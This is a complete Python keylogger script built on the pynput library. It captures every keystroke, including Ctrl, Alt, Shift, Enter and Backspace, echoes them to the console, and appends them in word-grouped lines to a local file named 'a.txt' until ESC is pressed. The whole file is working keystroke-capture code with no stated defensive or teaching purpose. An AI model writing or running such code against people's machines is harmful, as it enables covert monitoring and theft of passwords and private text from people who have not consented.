from pynput.keyboard import Listener, Key

class KeyLogger:
    def __init__(self, log_file="a.txt", max_words_per_line=10):
        self.log_file = log_file
        self.current_word = ""
        self.words_buffer = []
        self.max_words_per_line = max_words_per_line

    def on_press(self, key):
        try:
            if key == Key.esc:
                print("\nKeylogger stopped by ESC.")
                self.flush_buffer(final=True)
                return False

            if key == Key.space:
                self._add_word_to_buffer()
                print(' ', end='', flush=True)
                return

            special_keys = {
                Key.alt_l: "<Alt_L>",
                Key.alt_r: "<Alt_R>",
                Key.ctrl_l: "<Ctrl_L>",
                Key.ctrl_r: "<Ctrl_R>",
                Key.shift: "<Shift>",
                Key.shift_l: "<Shift_L>",
                Key.shift_r: "<Shift_R>",
                Key.enter: "<Enter>",
                Key.backspace: "<Backspace>",
                Key.tab: "<Tab>"
            }

            if key in special_keys:
                self._add_word_to_buffer()  
                print(special_keys[key], end='', flush=True)
                self.words_buffer.append(special_keys[key])
                return

            if hasattr(key, 'char') and key.char is not None:
                self.current_word += key.char
                print(key.char, end='', flush=True)

        except Exception as e:
            print(f"\nError: {e}")

    def _add_word_to_buffer(self, word=None):
        if word is None:
            word = self.current_word

        if word:
            self.words_buffer.append(word)
            self.current_word = ""

        if len(self.words_buffer) >= self.max_words_per_line:
            self.flush_buffer(newline=True)

    def flush_buffer(self, newline=False, final=False):
        if final and self.current_word:
            self.words_buffer.append(self.current_word)
            self.current_word = ""

        if self.words_buffer:
            with open(self.log_file, "a", encoding="utf-8") as f:
                line = ' '.join(self.words_buffer)
                if newline:
                    line += '\n'
                f.write(line)

            self.words_buffer = []

    def run(self):
        print("Keylogger started. Press ESC to stop.")
        with Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.run()

